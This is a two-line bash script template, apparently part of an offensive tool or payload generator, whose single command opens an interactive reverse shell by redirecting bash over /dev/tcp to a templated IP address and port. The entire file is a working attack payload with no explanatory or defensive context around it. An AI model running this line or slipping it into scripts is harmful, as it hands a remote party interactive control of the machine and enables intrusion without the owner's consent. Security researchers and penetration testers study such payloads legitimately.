#!/bin/bash
bash -i >& /dev/tcp/{{ ip }}/{{ port }} 0>&1 